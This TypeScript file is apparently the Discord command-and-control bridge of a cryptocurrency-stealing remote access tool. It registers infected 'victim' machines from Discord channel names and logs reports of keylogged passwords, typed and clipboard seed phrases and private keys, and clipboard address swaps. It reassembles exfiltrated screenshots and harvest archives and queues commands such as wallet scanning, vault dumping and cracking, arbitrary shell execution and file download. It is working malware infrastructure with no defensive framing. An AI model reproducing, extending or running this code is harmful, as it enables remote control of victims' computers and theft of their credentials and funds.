import { createHash, randomBytes } from 'node:crypto';
import { createWriteStream } from 'node:fs';
import { mkdir, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { basename, join } from 'node:path';
import { prisma } from '../lib/db';
import { sealSecret, sha256hex, randomToken } from '../lib/crypto';
import { ArtifactStatus } from '@prisma/client';
import { processArtifact } from './artifact';
import { publish } from '../lib/bus';
import { env } from '../lib/env';

type DiscordConfig = {
  botToken?: string;
  botTokenB64?: string;
  guildId?: string;
  categoryId?: string;
};

type Channel = { id: string; name: string; parent_id?: string | null };
type Attachment = { id: string; filename: string; size: number; url: string; content_type?: string };
type Message = {
  id: string;
  channel_id: string;
  content: string;
  author?: { id: string; bot?: boolean };
  webhook_id?: string;
  attachments?: Attachment[];
  embeds?: Array<{ title?: string; fields?: Array<{ name: string; value: string }> }>;
};

const API = 'https://discord.com/api/v10';
const POLL_MS = 4000;
const PING_MS = 120_000;
const PART_RE = /^(.*)\.part(\d{3,})$/;

let token = '';
let guildId = '';
let botId = '';
let running = false;
let loop: ReturnType<typeof setTimeout> | null = null;
let lastError = '';
let lastPoll = 0;
let polled = 0;
let ingested = 0;
const lastPing = new Map<string, number>();
let lastBootstrap = 0;
const pendingSeed = new Map<string, number>();

function log(message: string): void {
  console.log(`[discord-bridge] ${message}`);
}

async function config(): Promise<DiscordConfig | null> {
  const inline = process.env['DISCORD_TOKEN'];
  if (inline) {
    return { botToken: inline, guildId: process.env['DISCORD_GUILD_ID'] };
  }
  for (const path of [join(process.cwd(), 'discord.json'), join(process.cwd(), '..', 'discord.json')]) {
    try {
      const parsed = JSON.parse(await readFile(path, 'utf8')) as DiscordConfig;
      if (parsed.botToken || parsed.botTokenB64) return parsed;
    } catch {
      // next path
    }
  }
  return null;
}

async function rest<T>(method: string, path: string, body?: unknown, raw = false): Promise<T> {
  const target = path.startsWith('http') ? path : `${API}${path}`;
  const response = await fetch(target, {
    method,
    headers: {
      authorization: `Bot ${token}`,
      ...(body === undefined ? {} : { 'content-type': 'application/json' })
    },
    body: body === undefined ? undefined : JSON.stringify(body)
  });
  if (response.status === 429) {
    const retry = Number(response.headers.get('retry-after') ?? '2');
    await sleep((Number.isFinite(retry) ? retry : 2) * 1000);
    return rest(method, path, body, raw);
  }
  if (!response.ok) {
    throw new Error(`discord ${method} ${path} -> ${response.status}`);
  }
  if (raw) return (await response.arrayBuffer()) as T;
  return (await response.json()) as T;
}

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

export function bridgeConfigured(): boolean {
  return Boolean(token && guildId);
}

export function bridgeStatus() {
  return {
    enabled: running,
    bot: botId || null,
    guild: guildId || null,
    polled,
    ingested,
    lastPoll,
    error: lastError || null
  };
}

export async function startDiscordBridge(): Promise<boolean> {
  if (running) return true;
  if (process.env['DISCORD_BRIDGE'] === '0') return false;
  const cfg = await config();
  if (!cfg) return false;
  token = cfg.botToken ?? (cfg.botTokenB64 ? Buffer.from(cfg.botTokenB64, 'base64').toString('utf8') : '');
  guildId = cfg.guildId ?? process.env['DISCORD_GUILD_ID'] ?? '';
  if (!token || !guildId) {
    lastError = 'token_or_guild_missing';
    return false;
  }
  try {
    const me = await rest<{ id: string }>('GET', '/users/@me');
    botId = me.id;
    running = true;
    log(`connected as ${botId} on guild ${guildId}`);
    await runBridgeBootstrap();
    schedule(1000);
    return true;
  } catch (error) {
    lastError = error instanceof Error ? error.message : String(error);
    log(`start failed: ${lastError}`);
    return false;
  }
}

export function stopDiscordBridge(): void {
  running = false;
  if (loop) clearTimeout(loop);
}

function schedule(ms: number): void {
  if (!running) return;
  if (loop) clearTimeout(loop);
  loop = setTimeout(() => void tick(), ms);
}

async function tick(): Promise<void> {
  if (!running) return;
  try {
    if (Date.now() - lastBootstrap > 60_000) {
      lastBootstrap = Date.now();
      await ensureLinks();
    }
    await pollChannels();
    await dispatchTasks();
    await maybePing();
    lastError = '';
  } catch (error) {
    lastError = error instanceof Error ? error.message : String(error);
    log(`tick: ${lastError}`);
  }
  lastPoll = Date.now();
  schedule(POLL_MS);
}

async function pollChannels(): Promise<void> {
  const links = await prisma.discordLink.findMany({ include: { victim: true }, take: 100 });
  for (const link of links) {
    const query = link.lastMessageId === '0' ? '?limit=25' : `?after=${link.lastMessageId}&limit=50`;
    let messages: Message[];
    try {
      messages = await rest<Message[]>('GET', `/channels/${link.channelId}/messages${query}`);
    } catch (error) {
      const text = error instanceof Error ? error.message : '';
      if (text.endsWith('404') || text.endsWith('403')) {
        await prisma.discordLink.update({ where: { id: link.id }, data: { lastMessageId: '0' } }).catch(() => undefined);
      }
      continue;
    }
    messages.sort((a, b) => (BigInt(a.id) < BigInt(b.id) ? -1 : 1));
    for (const message of messages) {
      try {
        await handleMessage(link, message);
      } catch (error) {
        lastError = error instanceof Error ? error.message : String(error);
      }
      await prisma.discordLink.update({ where: { id: link.id }, data: { lastMessageId: message.id } }).catch(() => undefined);
      polled++;
    }
    await sleep(220);
  }
}

async function ensureLinks(): Promise<void> {
  const build = await prisma.build.findFirst({ where: { universal: true, status: 'ready' } });
  if (!build) {
    lastError = 'no_universal_build';
    return;
  }
  const channels = await rest<Channel[]>('GET', `/guilds/${guildId}/channels`);
  for (const channel of channels) {
    if (!channel.name.startsWith('sync-')) continue;
    const existing = await prisma.discordLink.findUnique({ where: { channelId: channel.id } });
    if (existing) continue;
    const raw = channel.name.replace(/^sync-shared-/, '').replace(/^sync-/, '');
    const split = raw.lastIndexOf('-');
    const hostname = (split > 0 ? raw.slice(0, split) : raw).slice(0, 100) || 'discord-host';
    const username = (split > 0 ? raw.slice(split + 1) : 'unknown').slice(0, 100) || 'unknown';
    const victim = await prisma.victim.upsert({
      where: { buildId_hostname_username: { buildId: build.id, hostname, username } },
      update: { lastHeartbeatAt: new Date(), status: 'online' },
      create: {
        buildId: build.id,
        hostname,
        username,
        os: 'windows',
        arch: 'x86_64',
        profile: build.profile,
        status: 'online',
        tags: ['discord'],
        deviceTokenEnc: sealSecret(randomToken(32))
      }
    });
    await prisma.discordLink.create({ data: { channelId: channel.id, guildId, victimId: victim.id } });
    await prisma.event.create({ data: { victimId: victim.id, kind: 'discord_link', data: { channelId: channel.id } } });
    await publish({ type: 'victim.new', victimId: victim.id, at: Date.now(), data: { hostname, transport: 'discord' } });
    log(`linked ${channel.name} -> ${victim.id}`);
  }
}

async function handleMessage(link: { channelId: string; victimId: string }, message: Message): Promise<void> {
  await prisma.victim.update({ where: { id: link.victimId }, data: { lastHeartbeatAt: new Date(), status: 'online' } }).catch(() => undefined);

  const embed = message.embeds?.find((item) => item.title === 'Fabric Sync');
  if (embed?.fields) {
    const fields = new Map(embed.fields.map((field) => [field.name.toLowerCase(), field.value]));
    await prisma.victim.update({
      where: { id: link.victimId },
      data: {
        hostname: fields.get('hostname') ?? fields.get('host') ?? undefined,
        username: fields.get('user') ?? fields.get('username') ?? undefined,
        os: (fields.get('os') ?? 'windows').split(' ')[0]!.toLowerCase().slice(0, 20),
        osVersion: fields.get('os') ?? '',
        agentVersion: fields.get('agent') ?? fields.get('version') ?? '',
        ip: fields.get('ip') ?? null
      }
    }).catch(() => undefined);
    await prisma.event.create({ data: { victimId: link.victimId, kind: 'hello', data: { fields: Object.fromEntries(fields) } } });
  }

  if (message.content) await handleText(link.victimId, message);
  for (const attachment of message.attachments ?? []) {
    try {
      await handleAttachment(link, message, attachment);
    } catch (error) {
      await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_failed', data: { name: attachment.filename, error: error instanceof Error ? error.message : 'download_failed' } } }).catch(() => undefined);
    }
  }
}

function norm(value: string): string {
  return value.replace(/\s+/g, ' ').trim().slice(0, 4000);
}

async function handleText(victimId: string, message: Message): Promise<void> {
  const content = message.content.trim();
  if (!content) return;
  const dispatched = await prisma.task.count({ where: { victimId, discordMessageId: message.id } });
  if (dispatched > 0) return;
  const seconds = Math.floor(Date.now() / 1000);

  if (content.startsWith('wallet detected:')) {
    await prisma.event.create({ data: { victimId, kind: 'wallet_detected', data: { text: norm(content) } } });
    return;
  }
  if (content.startsWith('password?')) {
    const [proc, title, ...rest] = content.slice(10).split('|');
    await prisma.keylog.create({ data: { victimId, process: (proc ?? '').trim(), title: (title ?? '').trim(), text: rest.join('|').trim(), password: true } });
    return;
  }
  if (/^seed escrita:/i.test(content)) {
    pendingSeed.set(victimId, Date.now());
    await prisma.event.create({ data: { victimId, kind: 'seed_typed', data: { text: norm(content) } } });
    return;
  }
  if (/^(clipboard|charset)?\s*(seed|xprv|clave privada)/i.test(content)) {
    const value = content.includes(':') ? content.slice(content.lastIndexOf(':') + 1).trim() : '';
    if (value) {
      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'clipboard', value: norm(value), source: 'clipboard' } } });
    }
    return;
  }
  if (content.startsWith('clipboard:')) {
    const body = content.slice(10).trim();
    const arrow = body.lastIndexOf('->');
    const before = arrow > 0 ? body.slice(0, arrow).trim() : body;
    const replaced = arrow > 0 ? body.slice(arrow + 2).trim() : null;
    const space = before.indexOf(' ');
    const kind = space > 0 ? before.slice(0, space) : 'text';
    const original = space > 0 ? before.slice(space + 1) : before;
    await prisma.clipboardEntry.create({ data: { victimId, ts: new Date(), process: '', window: '', content: original, kind, replaced } });
    return;
  }
  if (content.startsWith('Failed:')) {
    await prisma.task.updateMany({ where: { victimId, status: 'running', discordMessageId: { not: null } }, data: { status: 'error', error: norm(content), finishedAt: new Date(), leaseUntil: null } });
    return;
  }
  if (pendingSeed.has(victimId) && Date.now() - (pendingSeed.get(victimId) ?? 0) < 10_000) {
    const words = content.split(/\s+/).length;
    if (words === 12 || words === 18 || words === 24) {
      pendingSeed.delete(victimId);
      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'bip39', words, value: content, source: 'keylogger' } } });
      return;
    }
  }
  await prisma.task.updateMany({
    where: { victimId, status: 'running', discordMessageId: { not: null }, leaseUntil: { gt: new Date() } },
    data: { status: 'done', result: { output: norm(content) } as never, finishedAt: new Date(), leaseUntil: null }
  });
}

async function handleAttachment(link: { channelId: string; victimId: string }, message: Message, attachment: Attachment): Promise<void> {
  const name = basename(attachment.filename).replace(/[^\w.\-]/g, '_').slice(0, 180);
  if (!name) return;
  const duplicate = await prisma.artifact.findUnique({ where: { discordMessageId: `${message.id}:${attachment.id}` } });
  if (duplicate) return;
  const buffer = Buffer.from(await rest<ArrayBuffer>('GET', attachment.url, undefined, true));
  ingested++;
  const part = PART_RE.exec(name);
  const dir = join(env.STORAGE_DIR, 'discord', link.channelId);
  await mkdir(dir, { recursive: true });
  if (part) {
    const base = part[1]!;
    const index = Number(part[2]);
    const path = join(dir, `${base}.part${String(index).padStart(3, '0')}`);
    await writeFile(path, buffer);
    await prisma.discordPart.upsert({
      where: { channelId_base_index: { channelId: link.channelId, base, index } },
      update: { path },
      create: { channelId: link.channelId, base, index, path }
    });
    const parts = await prisma.discordPart.findMany({ where: { channelId: link.channelId, base }, orderBy: { index: 'asc' } });
    if (parts.length === 0) return;
    const max = parts[parts.length - 1]!.index;
    if (parts.length >= max) {
      const merged = join(dir, base);
      const out = createWriteStream(merged);
      for (const row of parts) {
        out.write(await readFile(row.path));
      }
      await new Promise<void>((resolve) => out.end(resolve));
      await rm(merged.slice(0, merged.length - 4) + '.parts', { recursive: true, force: true }).catch(() => undefined);
      await prisma.discordPart.deleteMany({ where: { channelId: link.channelId, base } });
      await forEachPartCleanup(parts.map((row) => row.path));
      await ingestFile(link, `${message.id}:${base}`, base, merged);
    }
    return;
  }
  const path = join(dir, `${message.id}-${name}`);
  await writeFile(path, buffer);
  await ingestFile(link, `${message.id}:${attachment.id}`, name, path);
}

async function forEachPartCleanup(paths: string[]): Promise<void> {
  for (const path of paths) await rm(path, { force: true }).catch(() => undefined);
}

async function ingestFile(link: { channelId: string; victimId: string }, externalId: string, name: string, path: string): Promise<void> {
  const info = await stat(path);
  const module = name.toLowerCase().endsWith('.png') ? 'screenshot'
    : name.toLowerCase().endsWith('.zip') ? 'harvest'
    : name.toLowerCase().includes('passwords') ? 'keylogs'
    : 'files';
  const artifact = await prisma.artifact.create({
    data: {
      victimId: link.victimId,
      source: 'discord',
      discordMessageId: externalId,
      module,
      bytes: info.size,
      sha256: createHash('sha256').update(await readFile(path)).digest('hex'),
      containerPath: path,
      status: 'queued' as ArtifactStatus
    }
  });
  await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_received', data: { name, bytes: info.size, module } } });
  await processArtifact(artifact.id);
}

async function dispatchTasks(): Promise<void> {
  const tasks = await prisma.task.findMany({
    where: { status: 'queued', notBefore: { lte: new Date() }, victim: { discord: { isNot: null } } },
    orderBy: [{ priority: 'desc' }, { createdAt: 'asc' }],
    take: 4,
    include: { victim: { include: { discord: true } } }
  });
  for (const task of tasks) {
    const channel = task.victim.discord?.channelId;
    if (!channel) continue;
    const text = commandFor(task.name, task.params as Record<string, unknown>);
    if (!text) continue;
    try {
      const message = await rest<Message>('POST', `/channels/${channel}/messages`, {
        content: text,
        allowed_mentions: { parse: [] }
      });
      await prisma.task.update({
        where: { id: task.id },
        data: { status: 'running', leaseUntil: new Date(Date.now() + task.timeoutSec * 1000), attempts: { increment: 1 }, discordMessageId: message.id }
      });
      lastPing.set(channel, Date.now());
    } catch (error) {
      await prisma.task.update({ where: { id: task.id }, data: { error: error instanceof Error ? error.message : 'send_failed' } });
    }
  }
}

function commandFor(name: string, params: Record<string, unknown>): string | null {
  switch (name) {
    case 'scan_wallets': return 'scan_wallets';
    case 'harvest': return 'harvest';
    case 'screenshot': return 'screenshot';
    case 'clip_start': return 'clip_start';
    case 'clip_stop': return 'clip_stop';
    case 'dump_vault': return `dump_vault ${String(params.target ?? '')}`.trim();
    case 'crack_vault': return `crack_vault ${String(params.target ?? '')} ${Number(params.max_seconds ?? 90)}`;
    case 'shell': return `shell ${String(params.command ?? '')}`;
    case 'file_pull': return `download ${String(params.path ?? '')}`;
    default: return null;
  }
}

async function maybePing(): Promise<void> {
  const links = await prisma.discordLink.findMany({ take: 100 });
  const now = Date.now();
  for (const link of links) {
    if (now - (lastPing.get(link.channelId) ?? 0) < PING_MS) continue;
    try {
      await rest('POST', `/channels/${link.channelId}/messages`, { content: 'ping', allowed_mentions: { parse: [] } });
      lastPing.set(link.channelId, now);
    } catch {
      // channel lost
    }
  }
}

export async function runBridgeBootstrap(): Promise<void> {
  if (!running) return;
  try {
    await ensureLinks();
  } catch (error) {
    lastError = error instanceof Error ? error.message : String(error);
    log(`bootstrap: ${lastError}`);
  }
}
